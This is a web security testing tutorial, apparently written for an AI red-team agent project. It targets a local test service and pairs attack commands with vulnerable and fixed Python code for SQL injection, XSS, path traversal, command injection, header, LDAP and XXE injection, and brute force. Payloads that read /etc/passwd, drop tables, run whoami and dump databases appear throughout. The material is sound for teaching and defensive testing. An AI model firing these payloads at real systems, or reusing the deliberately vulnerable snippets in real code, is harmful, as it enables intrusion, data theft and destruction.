# Manual Web Application Attack Guide
## How to Perform Security Tests Yourself Using Tools

**Target:** http://localhost:8080 (httpbin vulnerable web service)

---

## ATTACK #1: SQL INJECTION

### What it is:
SQL Injection allows attackers to interfere with database queries. If the application doesn't validate input, malicious SQL code can be executed.

### Manual Attack Command:
```bash
# Using SQLmap (automated)
sqlmap -u "http://localhost:8080/api/users?id=1" --dbs --risk=1 --level=1

# Using curl (manual test)
curl -v "http://localhost:8080/api/users?id=1' OR '1'='1"
curl -v "http://localhost:8080/api/users?id=1; DROP TABLE users;--"
```

### What to look for:
- SQL error messages in response
- Unexpected data returned
- Database structure exposed

### Example Vulnerable Code:
```python
# VULNERABLE CODE (Don't use!)
query = f"SELECT * FROM users WHERE id = {user_input}"
db.execute(query)  # DANGER!
```

### Safe Code:
```python
# SAFE - Use parameterized queries
query = "SELECT * FROM users WHERE id = ?"
db.execute(query, (user_input,))  # Parameter separated
```

---

## ATTACK #2: CROSS-SITE SCRIPTING (XSS)

### What it is:
XSS allows attackers to inject malicious JavaScript code that runs in victims' browsers. Can steal cookies, sessions, credentials.

### Manual Attack Command:
```bash
# Test 1: Reflected XSS
curl -v "http://localhost:8080/search?q=<script>alert('XSS')</script>"

# Test 2: Various XSS payloads
curl -v "http://localhost:8080/search?q=<img src=x onerror=alert('XSS')>"
curl -v "http://localhost:8080/search?q=<svg onload=alert('XSS')>"
curl -v "http://localhost:8080/search?q=<iframe src='javascript:alert(\"XSS\")'>"
```

### What to look for:
- Your payload appears in HTML source code
- JavaScript executes in browser
- No filtering or encoding applied

### Example Vulnerable Code:
```python
# VULNERABLE CODE
@app.route('/search')
def search():
    query = request.args.get('q')
    return f"<h1>Search results for: {query}</h1>"  # DANGER!
```

### Safe Code:
```python
# SAFE - Use HTML escaping
from markupsafe import escape

@app.route('/search')
def search():
    query = request.args.get('q')
    return f"<h1>Search results for: {escape(query)}</h1>"
```

---

## ATTACK #3: PATH TRAVERSAL (Directory Escape)

### What it is:
Path Traversal allows reading files outside the intended directory by using `../` sequences to traverse up the directory tree.

### Manual Attack Command:
```bash
# Read system files
curl -v "http://localhost:8080/files/../../../../etc/passwd"
curl -v "http://localhost:8080/download?file=../../config/secret.txt"
curl -v "http://localhost:8080/image?path=..\\..\\windows\\system32\\drivers\\etc\\hosts"

# Windows examples
curl -v "http://localhost:8080/files/..\\..\\windows\\system.ini"
curl -v "http://localhost:8080/read?file=..\\..\\config.ini"
```

### What to look for:
- File contents returned in response
- System file content (passwd, config, .ini files)
- Error messages revealing path structure

### Example Vulnerable Code:
```python
# VULNERABLE CODE
@app.route('/files/<path>')
def read_file(path):
    return open(f"./uploads/{path}").read()  # DANGER!
    # If path="../etc/passwd", reads system file!
```

### Safe Code:
```python
# SAFE - Validate and sanitize path
import os
from pathlib import Path

@app.route('/files/<path>')
def read_file(path):
    base_dir = Path("./uploads").resolve()
    file_path = (base_dir / path).resolve()
    
    # Ensure file is within uploads directory
    if not str(file_path).startswith(str(base_dir)):
        return "Access denied", 403
    
    return open(file_path).read()
```

---

## ATTACK #4: COMMAND INJECTION

### What it is:
Command Injection allows executing arbitrary OS commands on the server. If user input is passed to system commands without validation.

### Manual Attack Command:
```bash
# Test OS command execution
curl -v "http://localhost:8080/ping?host=localhost;whoami"
curl -v "http://localhost:8080/ping?host=localhost|id"
curl -v "http://localhost:8080/ping?host=localhost`uname -a`"
curl -v "http://localhost:8080/ping?host=localhost$(whoami)"

# More complex commands
curl -v "http://localhost:8080/cmd?input=test;cat /etc/passwd;echo"
curl -v "http://localhost:8080/exec?cmd=ls%20-la"
```

### What to look for:
- Output of system commands in response
- User IDs, system info, file listings
- Command execution confirmed

### Example Vulnerable Code:
```python
# VULNERABLE CODE
import os

@app.route('/ping')
def ping():
    host = request.args.get('host')
    result = os.system(f"ping -c 1 {host}")  # DANGER!
    # If host="localhost;whoami", runs whoami command!
    return str(result)
```

### Safe Code:
```python
# SAFE - Use subprocess with list (no shell)
import subprocess

@app.route('/ping')
def ping():
    host = request.args.get('host')
    
    # Validate host input
    if not host.replace('.', '').replace('-', '').isalnum():
        return "Invalid host", 400
    
    # Use list, not shell=True
    try:
        result = subprocess.run(
            ["ping", "-c", "1", host],
            capture_output=True,
            timeout=5,
            shell=False  # Important!
        )
        return result.stdout.decode()
    except:
        return "Ping failed", 500
```

---

## ATTACK #5: HTTP HEADER INJECTION

### What it is:
Injecting malicious data into HTTP headers when the application doesn't validate header input. Can lead to cache poisoning, session hijacking, or XSS.

### Manual Attack Command:
```bash
# Test header injection
curl -v \
  -H "User-Agent: RedAgent/Attack" \
  -H "X-Forwarded-For: 127.0.0.1; DROP TABLE users" \
  -H "X-Original-URL: /admin" \
  -H "Authorization: Bearer invalid_token_test" \
  http://localhost:8080

# CRLF Injection (insert newlines in headers)
curl -v "http://localhost:8080/?header=value%0d%0aSet-Cookie:admin=true"
```

### What to look for:
- Injected headers appear in response
- Unexpected cookies set
- Cache headers modified
- Server behavior changes

### Example Vulnerable Code:
```python
# VULNERABLE CODE
@app.route('/api')
def api():
    user_agent = request.headers.get('User-Agent')
    
    # Dangerous: User input in response header
    response = make_response("OK")
    response.headers['X-Debug'] = user_agent  # DANGER!
    return response
```

### Safe Code:
```python
# SAFE - Validate and sanitize headers
import re

@app.route('/api')
def api():
    user_agent = request.headers.get('User-Agent', '')
    
    # Remove newlines and dangerous characters
    safe_ua = re.sub(r'[\r\n\x00]', '', user_agent)
    
    response = make_response("OK")
    response.headers['X-Debug'] = safe_ua[:255]  # Limited length
    return response
```

---

## ATTACK #6: LDAP INJECTION

### What it is:
LDAP Injection allows modifying LDAP query logic when user input isn't properly validated.

### Manual Attack Command:
```bash
# Test LDAP injection
curl -v "http://localhost:8080/login?user=*)(uid=*&pass=test"
curl -v "http://localhost:8080/search?name=admin*)(|(cn=*&password=test"
curl -v "http://localhost:8080/ldap?filter=*)(&(uid=*"
```

### What to look for:
- LDAP error messages in response
- Unexpected authentication success
- Directory structure information leaked

### Example Vulnerable Code:
```python
# VULNERABLE CODE
import ldap

@app.route('/login')
def login():
    username = request.form.get('username')
    password = request.form.get('password')
    
    # DANGER! User input directly in LDAP filter
    filter = f"(uid={username})"
    ldap_conn.search_s(ldap_base, ldap.SCOPE_SUBTREE, filter)
```

### Safe Code:
```python
# SAFE - Use proper LDAP escaping
from ldap.filter import escape_filter_chars
import ldap

@app.route('/login')
def login():
    username = request.form.get('username')
    password = request.form.get('password')
    
    # Escape LDAP special characters
    safe_username = escape_filter_chars(username)
    filter = f"(uid={safe_username})"
    ldap_conn.search_s(ldap_base, ldap.SCOPE_SUBTREE, filter)
```

---

## ATTACK #7: XXE (XML EXTERNAL ENTITY) INJECTION

### What it is:
XXE exploits XML parsers that process external entities. Can read files, SSRF attacks, denial of service.

### Manual Attack Command:
```bash
# Test XXE - File Read
curl -v -X POST \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>' \
  http://localhost:8080/api/xml

# XXE - SSRF Attack
curl -v -X POST \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://internal-server:8080/admin">
]>
<foo>&xxe;</foo>' \
  http://localhost:8080/process
```

### What to look for:
- File contents in response
- Access to internal services
- XML parsing errors

### Example Vulnerable Code:
```python
# VULNERABLE CODE
import xml.etree.ElementTree as ET

@app.route('/api/xml', methods=['POST'])
def parse_xml():
    xml_data = request.data
    
    # DANGER! Processes external entities
    tree = ET.parse(xml_data)
    return tree.getroot().text
```

### Safe Code:
```python
# SAFE - Disable external entities
import defusedxml.ElementTree as ET

@app.route('/api/xml', methods=['POST'])
def parse_xml():
    xml_data = request.data
    
    # defusedxml prevents XXE attacks
    tree = ET.parse(xml_data)
    return tree.getroot().text
```

---

## ATTACK #8: HTTP BASIC AUTH BRUTE FORCE

### What it is:
Testing weak or default credentials by attempting multiple username/password combinations.

### Manual Attack Command:
```bash
# Single credential test
curl -v -u admin:admin http://localhost:8080/admin
curl -v -u admin:password http://localhost:8080/admin
curl -v -u root:root http://localhost:8080/admin

# Check HTTP response code
# 200 = Success
# 401 = Unauthorized
# 403 = Forbidden

# Using curl with verbose to see auth header
curl -v -u "admin:admin" -H "Authorization: Bearer token" http://localhost:8080

# Automated brute force
for pass in password admin123 test letmein; do
    echo "Trying admin:$pass"
    curl -s -u "admin:$pass" http://localhost:8080/admin | grep -q "Success" && echo "FOUND: admin:$pass"
done
```

### What to look for:
- HTTP 200 response (success)
- User data displayed
- Session cookies set
- Successful authentication

### Example Weak Configuration:
```python
# VULNERABLE - Default credentials
ADMIN_USER = "admin"
ADMIN_PASS = "admin"  # Default!

@app.route('/admin')
def admin():
    auth = request.authorization
    if auth and auth.username == ADMIN_USER and auth.password == ADMIN_PASS:
        return "Admin panel"
    return "Unauthorized", 401
```

### Safe Code:
```python
# SAFE - Use strong hashing and unique credentials
from werkzeug.security import check_password_hash
import os

@app.route('/admin')
@require_auth
def admin():
    auth = request.authorization
    
    # Check hashed password
    stored_hash = db.query(f"SELECT password FROM users WHERE username=?", (auth.username,))
    
    if stored_hash and check_password_hash(stored_hash, auth.password):
        return "Admin panel"
    
    return "Unauthorized", 401
```

---

## QUICK REFERENCE: Using RedAgent's Tools

### Using CURL for Web Attacks:
```bash
# Simple GET request
curl -v http://localhost:8080

# POST request with data
curl -X POST -d "param1=value1&param2=value2" http://localhost:8080/api

# Custom headers
curl -H "X-Custom-Header: value" http://localhost:8080

# Basic auth
curl -u username:password http://localhost:8080

# JSON POST
curl -X POST \
  -H "Content-Type: application/json" \
  -d '{"key": "value"}' \
  http://localhost:8080/api
```

### Using SQLMap for SQL Injection:
```bash
# Basic scan
sqlmap -u "http://localhost:8080/users?id=1"

# Specify parameter
sqlmap -u "http://localhost:8080/search?q=test" -p q

# Enumerate databases
sqlmap -u "http://localhost:8080/users?id=1" --dbs

# Extract tables
sqlmap -u "http://localhost:8080/users?id=1" --tables

# Dump data
sqlmap -u "http://localhost:8080/users?id=1" --dump
```

### Using Hydra for Brute Force:
```bash
# HTTP Basic Auth
hydra -l admin -P wordlist.txt -f http://localhost:8080 http-get

# HTTP POST form
hydra -l admin -P wordlist.txt http://localhost:8080 http-post-form "/login:user=^USER^&pass=^PASS^:F=Invalid"

# SSH brute force
hydra -l admin -P wordlist.txt ssh://localhost
```

---

## Testing Checklist

Use this when manually testing a web application:

- [ ] Run Nmap to identify services: `nmap -sV localhost`
- [ ] Check HTTP headers: `curl -v http://target`
- [ ] Test SQL injection: Try `' OR '1'='1` in inputs
- [ ] Test XSS: Try `<script>alert(1)</script>` in inputs
- [ ] Test path traversal: Try `../../../etc/passwd`
- [ ] Test command injection: Try `; whoami` in inputs
- [ ] Check for XXE: Try XML entity payloads
- [ ] Brute force weak creds: Try common passwords
- [ ] Check security headers: Missing CSP, X-Frame-Options, etc.
- [ ] Review error messages: Do they reveal system info?

---

## Resources

- OWASP Top 10: https://owasp.org/www-project-top-ten/
- PortSwigger Web Security: https://portswigger.net/web-security
- HackTricks: https://book.hacktricks.xyz/
- Payload All The Things: https://github.com/swisskyrepo/PayloadsAllTheThings

---

**IMPORTANT:** Only use these attacks on systems you have permission to test. Unauthorized security testing is illegal.
